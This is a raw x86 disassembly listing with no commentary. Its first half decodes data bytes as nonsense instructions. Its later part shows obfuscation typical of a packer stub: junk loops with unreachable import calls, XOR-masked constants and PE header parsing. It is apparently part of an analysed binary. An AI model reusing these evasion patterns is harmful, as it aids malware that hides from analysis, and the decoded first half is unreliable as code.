  4137b9:	and    bh,BYTE PTR [ecx+0x20]
  4137bc:	cwde   
  4137bd:	cmp    edx,ecx
  4137bf:	fmul   st(1),st
  4137c1:	repnz shl ch,0x64
  4137c5:	jecxz  0x413841
  4137c7:	sbb    DWORD PTR [eax],edx
  4137c9:	push   esp
  4137ca:	pop    ds
  4137cb:	sub    ebx,eax
  4137cd:	mov    ch,BYTE PTR [ecx+0x72535c5e]
  4137d3:	mov    edi,0x8c494f9c
  4137d8:	in     al,0xc4
  4137da:	jno    0x413838
  4137dc:	jg     0x4137cd
  4137de:	or     DWORD PTR [eax],0x405adc74
  4137e4:	jbe    0x413858
  4137e6:	in     eax,0x8c
  4137e8:	mov    dl,0x10
  4137ea:	jno    0x41386b
  4137ec:	shl    DWORD PTR [esi-0x6fde4871],1
  4137f2:	cmp    al,0xb4
  4137f4:	aam    0xf9
  4137f6:	out    0xcf,al
  4137f8:	jnp    0x4137f8
  4137fa:	nop
  4137fb:	add    bl,BYTE PTR [ecx+esi*2+0x1c]
  4137ff:	adc    BYTE PTR [eax+0x523220cb],dh
  413805:	stos   BYTE PTR es:[edi],al
  413806:	or     dl,bh
  413808:	std    
  413809:	hlt    
  41380a:	imul   BYTE PTR [edi-0x4b8a974e]
  413810:	dec    edi
  413811:	push   ecx
  413812:	sub    DWORD PTR [esi-0xa8f5109],eax
  413818:	mov    edx,0xd3429384
  41381d:	mov    ds:0x2a7be197,eax
  413822:	shr    DWORD PTR [edx+0x7c],cl
  413825:	loope  0x41383b
  413827:	push   cs
  413828:	mov    al,0x62
  41382a:	cdq    
  41382b:	adc    eax,0x47148280
  413830:	stos   DWORD PTR es:[edi],eax
  413831:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413832:	mov    esi,0x7c9d382d
  413837:	sbb    esp,DWORD PTR [eax-0x39]
  41383a:	xchg   ecx,eax
  41383b:	gs nop
  41383d:	shr    BYTE PTR [eax+edi*1-0x485790c1],1
  413844:	leave  
  413845:	dec    ebp
  413846:	push   eax
  413847:	aas    
  413848:	(bad)  
  413849:	out    0xd7,al
  41384b:	sub    BYTE PTR [ebx+0x17],cl
  41384e:	daa    
  41384f:	sub    BYTE PTR [edi+0x36beee4d],ch
  413855:	sub    BYTE PTR [ecx+esi*1+0x31],cl
  413859:	xchg   edx,eax
  41385a:	mov    dl,0x64
  41385c:	xchg   ecx,esp
  41385e:	or     edx,DWORD PTR [esi]
  413860:	xlat   BYTE PTR ds:[ebx]
  413861:	cmc    
  413862:	mov    edi,0x831bcaaa
  413867:	aad    0xdc
  413869:	mov    DWORD PTR [esi-0x2ee70c00],ecx
  41386f:	adc    dl,0x9f
  413872:	cld    
  413873:	outs   dx,DWORD PTR ds:[esi]
  413874:	inc    edx
  413875:	pop    ecx
  413876:	loopne 0x4138d8
  413878:	add    BYTE PTR [esi],ch
  41387a:	test   DWORD PTR [edi],0xc71a186f
  413880:	jp     0x41389f
  413882:	push   edi
  413883:	and    BYTE PTR [esi*8+0x50493ab2],cl
  41388a:	and    eax,0xfffffff0
  41388d:	neg    edi
  41388f:	aaa    
  413890:	add    BYTE PTR [ebp-0x1e],dh
  413893:	pop    ss
  413894:	(bad)  
  413895:	arpl   WORD PTR [ecx+0x5c],cx
  413898:	repz ds sbb eax,0xf66509db
  41389f:	clc    
  4138a0:	dec    edx
  4138a1:	das    
  4138a2:	pop    esi
  4138a3:	sub    eax,0x51b3fdb7
  4138a8:	push   edi
  4138a9:	in     eax,0x4
  4138ab:	xor    cl,BYTE PTR [ebp+0x6e675a7a]
  4138b1:	mov    ch,BYTE PTR [ebp+0x7a]
  4138b4:	mov    esi,0xb79ae5ed
  4138b9:	psrad  mm2,QWORD PTR [ebp+0x4e]
  4138bd:	jg     0x4138ae
  4138bf:	add    eax,0x51ac9f1b
  4138c4:	xor    al,0x8b
  4138c6:	pop    edx
  4138c7:	js     0x413937
  4138c9:	pavgb  mm4,mm4
  4138cc:	sbb    al,0x28
  4138ce:	fnstenv [ecx+0x1e1c7543]
  4138d4:	out    0x1a,eax
  4138d6:	ror    DWORD PTR [edx+0x5e],1
  4138d9:	(bad)  
  4138da:	scas   eax,DWORD PTR es:[edi]
  4138db:	and    DWORD PTR [eax+0x7df40f28],esi
  4138e1:	sub    al,0xe9
  4138e3:	stc    
  4138e4:	dec    ebx
  4138e5:	cmove  ebp,esi
  4138e8:	jno    0x413886
  4138ea:	int    0x8e
  4138ec:	mov    ah,0x4f
  4138ee:	into   
  4138ef:	mov    edi,0xcb93f77c
  4138f4:	add    dh,cl
  4138f6:	mov    ds:0x602d4c45,eax
  4138fb:	ret    0xd72a
  4138fe:	sbb    BYTE PTR [esi-0x6b482954],bh
  413904:	test   eax,0x10c1453a
  413909:	jo     0x41394b
  41390b:	push   cs
  41390c:	adc    al,0x2f
  41390e:	pop    eax
  41390f:	dec    ebp
  413910:	aas    
  413911:	fs cmp al,0x39
  413914:	pop    es
  413915:	dec    esi
  413916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413917:	cmc    
  413918:	cld    
  413919:	ds retf 
  41391b:	fimul  DWORD PTR ds:0x398a8281
  413921:	add    al,0xea
  413923:	push   cs
  413924:	mov    edi,0x90e11c42
  413929:	mov    esi,0xa63a0a24
  41392e:	lods   al,BYTE PTR ds:[esi]
  41392f:	cmp    DWORD PTR [ebx+edi*4],ebx
  413932:	sbb    ecx,DWORD PTR [eax-0xd]
  413935:	out    0xf9,eax
  413937:	stos   DWORD PTR es:[edi],eax
  413938:	sbb    ebx,edi
  41393a:	ins    DWORD PTR es:[edi],dx
  41393b:	pop    ebp
  41393c:	mov    DWORD PTR [edx+0x6e2b77a9],edx
  413942:	xchg   ebx,eax
  413943:	and    al,0xaa
  413945:	cmp    bl,BYTE PTR ds:0x6d616ac3
  41394b:	xlat   BYTE PTR ds:[ebx]
  41394c:	jae    0x4138f0
  41394e:	mov    esi,0xe56c7326
  413953:	adc    eax,0x5ec27fe9
  413958:	xor    BYTE PTR [edi],dl
  41395a:	dec    ebx
  41395b:	(bad)  
  41395c:	icebp  
  41395d:	ffree  st(4)
  41395f:	out    0x4,al
  413961:	add    ebx,ebx
  413963:	cmp    esi,DWORD PTR [esi-0x4f]
  413966:	and    DWORD PTR [ecx+0x51],esi
  413969:	pop    ebx
  41396a:	pop    esp
  41396b:	es test eax,0x9652848d
  413971:	xchg   ecx,eax
  413972:	mov    esi,0x94594b9e
  413977:	and    ebp,DWORD PTR [ebp+0x39b850ab]
  41397d:	jnp    0x4139b0
  41397f:	jecxz  0x413973
  413981:	xor    al,0xce
  413983:	mov    gs,WORD PTR [edi]
  413985:	jmp    0x413994
  413987:	jl     0x4139a8
  413989:	or     DWORD PTR [ecx+0x2d05fb71],ebx
  41398f:	pop    ebp
  413990:	pslld  mm7,mm4
  413993:	jmp    0xbacd:0x48113df2
  41399a:	dec    ebx
  41399b:	xor    ch,0x25
  41399e:	sbb    eax,0x46d449f8
  4139a3:	pop    esp
  4139a4:	mov    DWORD PTR [edi],ebp
  4139a6:	sbb    BYTE PTR [eax+0x375a247d],bl
  4139ac:	in     al,dx
  4139ad:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  4139af:	ins    BYTE PTR es:[edi],dx
  4139b0:	lea    esi,[eax+ecx*2+0x6eeaed80]
  4139b7:	mov    edx,0xe6329a50
  4139bc:	jl     0x413a37
  4139be:	setge  BYTE PTR [edx]
  4139c1:	js     0x4139b3
  4139c3:	add    al,0xf6
  4139c5:	mov    esi,0xbbf7015d
  4139ca:	pop    ss
  4139cb:	mov    ds:0xfdfd517f,al
  4139d0:	or     al,0xb8
  4139d2:	ror    ebp,1
  4139d4:	pop    ds
  4139d5:	sub    ecx,DWORD PTR [edx-0x4375d94]
  4139db:	fwait
  4139dc:	(bad)  
  4139dd:	(bad)  
  4139de:	jmp    0x41398f
  4139e0:	(bad)  
  4139e1:	mov    ecx,0x3d6b1997
  4139e6:	mov    edx,0x6e09748d
  4139eb:	inc    esi
  4139ec:	ss xchg edx,eax
  4139ee:	and    DWORD PTR [ebp+ebp*2-0x6ffce9c2],edi
  4139f5:	inc    ebp
  4139f6:	inc    edx
  4139f7:	or     eax,0x3a587145
  4139fc:	mov    edi,0x51b265a7
  413a01:	jg     0x4139ae
  413a03:	adc    dh,bh
  413a05:	mov    WORD PTR [ecx+0x1a],?
  413a08:	aad    0x18
  413a0a:	pop    ecx
  413a0b:	ret    0xc818
  413a0e:	stos   BYTE PTR es:[edi],al
  413a0f:	aam    0xb4
  413a11:	idiv   DWORD PTR [ebx-0xedaa689]
  413a17:	cld    
  413a18:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a19:	(bad)  
  413a1a:	pop    ebx
  413a1b:	adc    ch,BYTE PTR [esi]
  413a1d:	je     0x4139c3
  413a1f:	push   0x15
  413a21:	push   es
  413a22:	jmp    0x9079e8d5
  413a27:	push   ebx
  413a28:	pop    eax
  413a29:	hlt    
  413a2a:	jle    0x413a53
  413a2c:	inc    ecx
  413a2d:	sti    
  413a2e:	aad    0x8c
  413a30:	pop    ds
  413a31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a32:	xchg   ebp,eax
  413a33:	and    eax,0x13620277
  413a38:	jo     0x413a77
  413a3a:	stos   DWORD PTR es:[edi],eax
  413a3b:	clc    
  413a3c:	test   al,0xfb
  413a3e:	jl     0x413a77
  413a40:	in     eax,dx
  413a41:	pop    es
  413a42:	push   ebp
  413a43:	pop    eax
  413a44:	nop
  413a45:	inc    esp
  413a46:	sub    DWORD PTR [ebx],ebx
  413a48:	mov    ecx,ss
  413a4a:	ret    
  413a4b:	pop    esi
  413a4c:	xchg   edx,eax
  413a4d:	sub    BYTE PTR [edx+0xc],bh
  413a50:	or     dl,cl
  413a52:	popa   
  413a53:	push   ebp
  413a54:	in     al,0x52
  413a56:	mov    ch,0x6d
  413a58:	ds xor eax,0x2913eca5
  413a5e:	repz push cs
  413a60:	loope  0x413a43
  413a62:	js     0x413adf
  413a64:	adc    eax,0x312e87ae
  413a69:	dec    edx
  413a6a:	mov    ch,0x2f
  413a6c:	inc    edx
  413a6d:	mov    esi,0x4a2f2295
  413a72:	(bad)  
  413a73:	shl    BYTE PTR [eax],1
  413a75:	and    al,BYTE PTR [edi-0x1a3807b6]
  413a7b:	cli    
  413a7c:	inc    ecx
  413a7d:	leave  
  413a7e:	and    bh,BYTE PTR [eax-0x3d]
  413a81:	sahf   
  413a82:	gs fisubr WORD PTR ds:[esi]
  413a86:	xchg   edx,eax
  413a87:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  413a89:	xchg   ebp,eax
  413a8a:	enter  0x2210,0xc0
  413a8e:	sti    
  413a8f:	mov    dl,0x45
  413a91:	sbb    eax,0x6bfd7f5f
  413a96:	ins    DWORD PTR es:[edi],dx
  413a97:	cmp    BYTE PTR [ebp+0xb],ah
  413a9a:	jae    0x413aed
  413a9c:	ror    DWORD PTR [ecx+ebp*8+0x6695a6bb],0xaa
  413aa4:	dec    ecx
  413aa5:	shl    DWORD PTR [esi],cl
  413aa7:	cmp    al,0x3a
  413aa9:	mov    ds:0x44268a84,al
  413aae:	mov    dh,0x2c
  413ab0:	xchg   ebx,eax
  413ab1:	arpl   WORD PTR [edi-0x7f],di
  413ab4:	adc    al,0x3a
  413ab6:	xor    esp,esi
  413ab8:	push   edx
  413ab9:	aaa    
  413aba:	xchg   ah,ah
  413abc:	pop    ecx
  413abd:	or     DWORD PTR [ebp-0x3c17b16b],eax
  413ac3:	sub    al,al
  413ac5:	aas    
  413ac6:	lock dec ebx
  413ac8:	push   ds
  413ac9:	dec    BYTE PTR [esi]
  413acb:	and    al,0x1f
  413acd:	nop
  413ace:	idiv   DWORD PTR [ebp+0x41e79b3]
  413ad4:	jb     0x413ac3
  413ad6:	scas   eax,DWORD PTR es:[edi]
  413ad7:	mov    WORD PTR [edi+0x7e],ss
  413ada:	lods   eax,DWORD PTR ds:[esi]
  413adb:	or     BYTE PTR [edx+0x4d],ch
  413ade:	push   esi
  413adf:	fisttp WORD PTR [eax-0x61]
  413ae2:	cs into 
  413ae4:	cmp    ecx,DWORD PTR [ebp-0x61]
  413ae7:	xor    dh,dh
  413ae9:	jmp    0x739ee09b
  413aee:	dec    edi
  413aef:	or     ah,dl
  413af1:	bound  esp,QWORD PTR [eax+0x0]
  413af4:	aam    0x9
  413af6:	in     eax,dx
  413af7:	pop    edx
  413af8:	jp     0x413b4a
  413afa:	les    edx,FWORD PTR [ebx-0x42]
  413afd:	aam    0x79
  413aff:	data16 cmp bl,BYTE PTR [ecx+0x6c]
  413b03:	dec    edx
  413b04:	adc    eax,0xe798b69d
  413b09:	imul   edx,DWORD PTR [esi],0x45a074c7
  413b0f:	int3   
  413b10:	dec    edi
  413b11:	jne    0x413b11
  413b13:	lock xchg esi,eax
  413b15:	mov    ah,0xc3
  413b17:	retf   0xf73a
  413b1a:	jg     0x413b08
  413b1c:	sub    eax,eax
  413b1e:	repnz clc 
  413b20:	xor    eax,DWORD PTR [edx+ebp*1+0x7d]
  413b24:	out    dx,al
  413b25:	in     eax,0x4c
  413b27:	mov    ds:0x9eab16f9,eax
  413b2c:	div    DWORD PTR [edi+ecx*1]
  413b2f:	ja     0x413b9d
  413b31:	dec    edi
  413b32:	sbb    ecx,DWORD PTR [edx]
  413b34:	mov    bl,0x92
  413b36:	pusha  
  413b37:	shl    BYTE PTR [edx],0x56
  413b3a:	out    dx,eax
  413b3b:	inc    DWORD PTR [ebx+0x40]
  413b3e:	push   0xffffffc4
  413b40:	dec    edi
  413b41:	pop    ecx
  413b42:	pop    ebp
  413b43:	call   0x20c3:0x97ac8f48
  413b4a:	cmp    BYTE PTR [ecx-0x28399185],ah
  413b50:	mov    al,ds:0x685dcd0f
  413b55:	adc    al,0x1
  413b57:	sar    DWORD PTR [ebx-0x54],cl
  413b5a:	loope  0x413b73
  413b5c:	rol    DWORD PTR [esi+0x3ab70d16],0x60
  413b63:	pop    eax
  413b64:	in     eax,0x63
  413b66:	mov    gs,WORD PTR [ebp+0x21]
  413b69:	mov    ah,0xde
  413b6b:	and    dh,bl
  413b6d:	outs   dx,DWORD PTR ds:[esi]
  413b6e:	jno    0x413ba9
  413b70:	sbb    al,0x1c
  413b72:	rol    BYTE PTR [ebp+0x7],cl
  413b75:	mov    al,0x5a
  413b77:	dec    edi
  413b78:	in     al,dx
  413b79:	xchg   esp,eax
  413b7a:	loop   0x413bb1
  413b7c:	leave  
  413b7d:	cdq    
  413b7e:	pop    ds
  413b7f:	fidiv  WORD PTR [edx-0xcc8f968]
  413b85:	jmp    0x413b4f
  413b87:	sahf   
  413b88:	fadd   st,st(2)
  413b8a:	out    0x79,al
  413b8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b8d:	pop    esp
  413b8e:	add    dl,0xfd
  413b91:	jno    0x413be9
  413b93:	push   ebx
  413b94:	ins    DWORD PTR es:[edi],dx
  413b95:	lea    ecx,[edi]
  413b97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b98:	or     DWORD PTR [ebx],ebp
  413b9a:	out    0x44,eax
  413b9c:	adc    al,0x1e
  413b9e:	movzx  esi,BYTE PTR es:[esi+0x4a]
  413ba3:	pop    ebx
  413ba4:	test   eax,0x26d9bdd1
  413ba9:	(bad)  
  413bab:	inc    BYTE PTR [eax+0x25563c4f]
  413bb1:	fucomip st,st(3)
  413bb3:	test   eax,0xa6dc6210
  413bb8:	cmp    ecx,esp
  413bba:	push   edi
  413bbb:	cmp    ebx,ecx
  413bbd:	in     al,dx
  413bbe:	das    
  413bbf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bc0:	cmp    DWORD PTR [ebx],ebx
  413bc2:	sbb    ebp,ebx
  413bc4:	arpl   WORD PTR [ecx],cx
  413bc6:	jns    0x413b8e
  413bc8:	in     al,dx
  413bc9:	mov    dh,0x62
  413bcb:	in     eax,0x53
  413bcd:	push   esp
  413bce:	ss popf 
  413bd0:	mov    cl,0xa6
  413bd2:	sbb    eax,0x6513938c
  413bd7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413bd8:	cld    
  413bd9:	mov    ah,0x66
  413bdb:	lock jns 0x413c1c
  413bde:	inc    edx
  413bdf:	jl     0x413b8a
  413be1:	call   0x765a3d47
  413be6:	jg     0x413c5c
  413be8:	pop    ss
  413be9:	add    edx,ecx
  413beb:	adc    edi,0xffffffff
  413bee:	xor    edx,eax
  413bf0:	xor    edi,0x0
  413bf3:	cmp    edx,esi
  413bf5:	jne    0x413c0d
  413bfb:	cmp    edi,ebx
  413bfd:	jne    0x413c0d
  413c03:	mov    eax,ds:0x421ce2
  413c08:	mov    ds:0x421cea,eax
  413c0d:	pop    edi
  413c0e:	pop    esi
  413c0f:	pop    ebx
  413c10:	pop    ebp
  413c11:	ret    0x8
  413c14:	push   ebp
  413c15:	mov    ebp,esp
  413c17:	push   ecx
  413c18:	mov    eax,ds:0x421ab2
  413c1d:	mov    eax,DWORD PTR [eax]
  413c1f:	add    DWORD PTR ds:0x42901c,eax
  413c25:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  413c2c:	mov    eax,DWORD PTR [ebp+0x8]
  413c2f:	adc    DWORD PTR ds:0x42a010,0x6bac
  413c39:	mov    al,BYTE PTR [eax]
  413c3b:	xor    DWORD PTR ds:0x42b018,0x428020
  413c45:	add    al,0xd
  413c47:	sbb    DWORD PTR ds:0x428004,0x428008
  413c51:	xor    al,0x6f
  413c53:	mov    DWORD PTR ds:0x428004,0x2e21
  413c5d:	cmp    al,0x35
  413c5f:	mov    DWORD PTR ds:0x42a00c,0x23cb
  413c69:	jne    0x413d26
  413c6f:	and    DWORD PTR ds:0x428024,0x429014
  413c79:	mov    eax,DWORD PTR [ebp+0x8]
  413c7c:	dec    edx
  413c7d:	mov    ecx,DWORD PTR [ebp+0x8]
  413c80:	and    edx,DWORD PTR ds:0x42b010
  413c86:	add    ecx,DWORD PTR [eax+0x3c]
  413c89:	mov    edx,0x7510893
  413c8e:	mov    DWORD PTR [ebp+0x8],ecx
  413c91:	and    DWORD PTR ds:0x42c008,0x0
  413c9b:	jmp    0x413cad
  413ca0:	mov    ecx,DWORD PTR ds:0x42c008
  413ca6:	inc    ecx
  413ca7:	mov    DWORD PTR ds:0x42c008,ecx
  413cad:	cmp    DWORD PTR ds:0x42c008,0x18
  413cb4:	jae    0x413cf8
  413cba:	cmp    DWORD PTR ds:0x42c008,0x9
  413cc1:	jne    0x413cd7
  413cc7:	push   0x429014
  413ccc:	push   0x5ace
  413cd1:	call   DWORD PTR ds:0x42403c
  413cd7:	cmp    DWORD PTR ds:0x42c008,0x8
  413cde:	jne    0x413cf3
  413ce4:	xor    ecx,ecx
  413ce6:	or     ecx,DWORD PTR ds:0x42c008
  413cec:	inc    ecx
  413ced:	mov    DWORD PTR ds:0x42c008,ecx
  413cf3:	jmp    0x413ca0
  413cf8:	mov    eax,DWORD PTR [ebp-0x4]
  413cfb:	xor    eax,edx
  413cfd:	push   esi
  413cfe:	mov    esi,DWORD PTR [ebp+0x8]
  413d01:	mov    ecx,0x3272db
  413d06:	add    eax,ecx
  413d08:	cmp    DWORD PTR [esi+0x54],eax
  413d0b:	pop    esi
  413d0c:	je     0x413d1a
  413d12:	mov    eax,DWORD PTR [ebp+0x8]
  413d15:	jmp    0x413d33
  413d1a:	mov    eax,DWORD PTR [ebp-0x4]
  413d1d:	xor    eax,edx
  413d1f:	add    eax,ecx
  413d21:	jmp    0x413d33
  413d26:	mov    eax,DWORD PTR [ebp-0x4]
  413d29:	xor    eax,0x7510893
  413d2e:	add    eax,0x3272db
  413d33:	leave  
  413d34:	ret    0x4
  413d37:	push   ebp
  413d38:	mov    ebp,esp
  413d3a:	sub    esp,0x18
  413d3d:	and    DWORD PTR ds:0x42901c,0x0
  413d47:	jmp    0x413d59
  413d4c:	mov    edx,DWORD PTR ds:0x42901c
  413d52:	inc    edx
  413d53:	mov    DWORD PTR ds:0x42901c,edx
  413d59:	cmp    DWORD PTR ds:0x42901c,0x1a
  413d60:	jae    0x413d92
  413d66:	cmp    DWORD PTR ds:0x42901c,0x22
  413d6d:	jne    0x413d83
  413d73:	push   0x8447
  413d78:	push   0x423878
  413d7d:	call   DWORD PTR ds:0x424040
  413d83:	jmp    0x413d4c
  413d88:	adc    DWORD PTR ds:0x42b010,0x42b00c
  413d92:	mov    DWORD PTR [ebp-0x10],0xf89f85b6
  413d99:	mov    ecx,DWORD PTR ds:0x421a7e
  413d9f:	mov    ecx,DWORD PTR [ecx]
  413da1:	and    DWORD PTR ds:0x42c01c,ecx
  413da7:	lea    eax,[ebp+0x14]
  413daa:	mov    DWORD PTR [ebp-0x4],eax
  413dad:	push   esi
  413dae:	and    DWORD PTR ds:0x428018,0x0
  413db8:	jmp    0x413dca
  413dbd:	mov    esi,DWORD PTR ds:0x428018
  413dc3:	inc    esi
  413dc4:	mov    DWORD PTR ds:0x428018,esi
  413dca:	cmp    DWORD PTR ds:0x428018,0x1a
  413dd1:	jae    0x413e9f
  413dd7:	cmp    DWORD PTR ds:0x428018,0x28
  413dde:	jne    0x413def
  413de4:	push   0x423893
  413de9:	call   DWORD PTR ds:0x424044
  413def:	jmp    0x413dbd
  413df4:	and    DWORD PTR ds:0x42c000,0x0
  413dfe:	mov    edx,DWORD PTR ds:0x42c000
  413e04:	inc    edx
  413e05:	mov    DWORD PTR ds:0x42c000,edx
  413e0b:	cmp    DWORD PTR ds:0x42c000,0x20
  413e12:	jne    0x413e2d
  413e18:	push   0x1ea1
  413e1d:	push   0x42b008
  413e22:	push   0x423956
  413e27:	call   DWORD PTR ds:0x424048
  413e2d:	cmp    DWORD PTR ds:0x42c000,0x11
  413e34:	jb     0x413dfe
  413e3a:	and    DWORD PTR ds:0x42b004,0x0
  413e44:	mov    edx,DWORD PTR ds:0x42b004
  413e4a:	inc    edx
  413e4b:	mov    DWORD PTR ds:0x42b004,edx
  413e51:	cmp    DWORD PTR ds:0x42b004,0xf
  413e58:	jne    0x413e6e
  413e5e:	push   0x428004
  413e63:	push   0x7cc5
  413e68:	call   DWORD PTR ds:0x424014
  413e6e:	cmp    DWORD PTR ds:0x42b004,0xe
  413e75:	jne    0x413e88
  413e7b:	mov    edx,DWORD PTR ds:0x42b004
  413e81:	inc    edx
  413e82:	mov    DWORD PTR ds:0x42b004,edx
  413e88:	cmp    DWORD PTR ds:0x42b004,0x1d
  413e8f:	jb     0x413e44
  413e95:	mov    DWORD PTR ds:0x428014,0x22a8
  413e9f:	mov    esi,0xf89c85b6
  413ea4:	and    DWORD PTR ds:0x428008,0x0
  413eae:	mov    edx,DWORD PTR ds:0x428008
  413eb4:	inc    edx
  413eb5:	mov    DWORD PTR ds:0x428008,edx
  413ebb:	cmp    DWORD PTR ds:0x428008,0x19
  413ec2:	jne    0x413ef2
  413ec8:	push   0x62e7
  413ecd:	push   0x428000
  413ed2:	push   0x75f3
  413ed7:	push   0x428000
  413edc:	push   DWORD PTR [ebp-0x24]
  413edf:	push   0x6458
  413ee4:	push   DWORD PTR [ebp-0x14]
  413ee7:	push   0x5743
  413eec:	call   DWORD PTR ds:0x424018
  413ef2:	cmp    DWORD PTR ds:0x428008,0x14
  413ef9:	jb     0x413eae
  413eff:	xor    ecx,ecx
  413f01:	add    ecx,DWORD PTR ds:0x429008
  413f07:	adc    DWORD PTR ds:0x42c00c,ecx
  413f0d:	mov    DWORD PTR [ebp-0xc],esi
  413f10:	lea    eax,[ebp-0xc]
  413f13:	dec    ecx
  413f14:	mov    DWORD PTR [ebp-0x14],eax
  413f17:	mov    eax,DWORD PTR [ebp-0xc]
  413f1a:	adc    ecx,0x29e6
  413f20:	mov    edx,DWORD PTR [ebp-0x14]
  413f23:	and    DWORD PTR ds:0x428018,0x0
  413f2d:	mov    ecx,DWORD PTR ds:0x428018
  413f33:	inc    ecx
  413f34:	mov    DWORD PTR ds:0x428018,ecx
  413f3a:	cmp    DWORD PTR ds:0x428018,0xb
  413f41:	jne    0x413f52
  413f47:	push   0x4faf
  413f4c:	call   DWORD PTR ds:0x42401c
  413f52:	cmp    DWORD PTR ds:0x428018,0xa
  413f59:	jne    0x413f6c
  413f5f:	mov    ecx,DWORD PTR ds:0x428018
  413f65:	inc    ecx
  413f66:	mov    DWORD PTR ds:0x428018,ecx
  413f6c:	cmp    DWORD PTR ds:0x428018,0x1e
  413f73:	jb     0x413f2d
  413f79:	inc    ecx
  413f7a:	mov    ecx,0x7510893
  413f7f:	neg    DWORD PTR ds:0x42a004
  413f85:	xor    eax,ecx
  413f87:	add    eax,0x3272db
  413f8c:	and    DWORD PTR ds:0x42c010,0x2759
  413f96:	mov    DWORD PTR [edx],eax
  413f98:	mov    edx,DWORD PTR ds:0x421a76
  413f9e:	mov    eax,ds:0x421a86
  413fa3:	sub    edx,eax
  413fa5:	and    edx,DWORD PTR [edx+eax*1]
  413fa8:	mov    eax,ds:0x421ade
  413fad:	inc    DWORD PTR ds:0x42a01c
  413fb3:	mov    edx,DWORD PTR [ebp-0x4]
  413fb6:	and    DWORD PTR ds:0x42a018,0x7b9c
  413fc0:	mov    eax,DWORD PTR [eax]
  413fc2:	and    DWORD PTR ds:0x42c000,0x5f81
  413fcc:	add    eax,DWORD PTR [edx]
  413fce:	movzx  edx,BYTE PTR ds:0x42a014
  413fd5:	or     DWORD PTR ds:0x42a01c,edx
  413fdb:	push   edi
  413fdc:	add    DWORD PTR ds:0x42a004,edx
  413fe2:	mov    DWORD PTR [ebp-0x8],eax
  413fe5:	movzx  edx,WORD PTR ds:0x428004
  413fec:	sbb    DWORD PTR ds:0x42a01c,edx
  413ff2:	mov    edi,DWORD PTR [ebp+0x8]
  413ff5:	and    DWORD PTR ds:0x42b01c,0x631e
  413fff:	mov    eax,ds:0x421c66
  414004:	mov    eax,DWORD PTR [eax+0x198]
  41400a:	xor    edi,ecx
  41400c:	mov    DWORD PTR ds:0x428018,0x14
  414016:	cmp    DWORD PTR ds:0x428018,0x0
  41401d:	je     0x414070
  414023:	cmp    DWORD PTR ds:0x428018,0x3
  41402a:	jne    0x41403e
  414030:	push   DWORD PTR [ebp-0x28]
  414033:	push   0x77dc
  414038:	call   DWORD PTR ds:0x424020
  41403e:	cmp    DWORD PTR ds:0x428018,0x4
  414045:	jne    0x414058
  41404b:	mov    edx,DWORD PTR ds:0x428018
  414051:	dec    edx
  414052:	mov    DWORD PTR ds:0x428018,edx
  414058:	mov    edx,DWORD PTR ds:0x428018
  41405e:	dec    edx
  41405f:	mov    DWORD PTR ds:0x428018,edx
  414065:	jmp    0x414016
  41406a:	and    DWORD PTR ds:0x42c014,ecx
  414070:	mov    edx,0x3272db
  414075:	sbb    DWORD PTR ds:0x429008,0x451c
  41407f:	add    edi,edx
  414081:	mov    DWORD PTR ds:0x42a000,0x2432
  41408b:	cmp    DWORD PTR [eax],edi
  41408d:	je     0x41409a
  414093:	mov    eax,DWORD PTR [eax]
  414095:	jmp    0x41ae5c
  41409a:	mov    eax,DWORD PTR [ebp+0x18]
  41409d:	cmp    eax,esi
  41409f:	jne    0x4140b9
  4140a5:	mov    DWORD PTR ds:0x42a01c,0x2296
  4140af:	push   0xf89c85b5
  4140b4:	jmp    0x41ae4b
  4140b9:	mov    esi,DWORD PTR [ebp+0x18]
  4140bc:	mov    eax,0x2f4e
  4140c1:	mov    eax,0xf89c85b4
  4140c6:	cmp    esi,eax
  4140c8:	jne    0x41ae3b
  4140ce:	sbb    esi,esi
  4140d0:	mov    eax,DWORD PTR [ebp+0x10]
  4140d3:	mov    esi,DWORD PTR ds:0x42c008
  4140d9:	sbb    esi,DWORD PTR ds:0x42a008
  4140df:	mov    DWORD PTR ds:0x42c008,esi
  4140e5:	xor    eax,ecx
  4140e7:	mov    DWORD PTR ds:0x428000,0x1b
  4140f1:	cmp    DWORD PTR ds:0x428000,0x0
  4140f8:	je     0x414161
  4140fe:	cmp    DWORD PTR ds:0x428000,0x4
  414105:	jne    0x414135
  41410b:	push   0x42a000
  414110:	push   0x8ffd
  414115:	push   DWORD PTR [ebp-0x14]
  414118:	push   0x428014
  41411d:	push   0x2d9f
  414122:	push   0x4239d0
  414127:	push   0x4cf3
  41412c:	push   DWORD PTR [ebp-0x1c]
  41412f:	call   DWORD PTR ds:0x424024
  414135:	cmp    DWORD PTR ds:0x428000,0x5
  41413c:	jne    0x41414f
  414142:	mov    esi,DWORD PTR ds:0x428000
  414148:	dec    esi
  414149:	mov    DWORD PTR ds:0x428000,esi
  41414f:	mov    esi,DWORD PTR ds:0x428000
  414155:	dec    esi
  414156:	mov    DWORD PTR ds:0x428000,esi
  41415c:	jmp    0x4140f1
  414161:	add    eax,edx
  414163:	mov    DWORD PTR [ebp-0x18],eax
  414166:	mov    eax,DWORD PTR [ebp+0xc]
  414169:	mov    esi,DWORD PTR [ebp-0x8]
  41416c:	xor    eax,ecx
  41416e:	add    eax,edx
  414170:	imul   eax,DWORD PTR [esi]
  414173:	mov    esi,DWORD PTR [ebp+0x8]
  414176:	xor    esi,ecx
  414178:	add    esi,edx
  41417a:	cmp    esi,eax
  41417c:	mov    eax,DWORD PTR [ebp-0x4]
  41417f:	push   ebx
  414180:	je     0x41419f
  414186:	mov    esi,DWORD PTR [ebp-0x18]
  414189:	add    DWORD PTR [eax],esi
  41418b:	mov    eax,DWORD PTR [ebp-0x4]
  41418e:	mov    esi,DWORD PTR [ebp+0xc]
  414191:	xor    esi,ecx
  414193:	add    esi,edx
  414195:	imul   esi,DWORD PTR [eax]
  414198:	mov    DWORD PTR [eax],esi
  41419a:	jmp    0x4141a4
  41419f:	mov    esi,DWORD PTR [ebp+0x14]
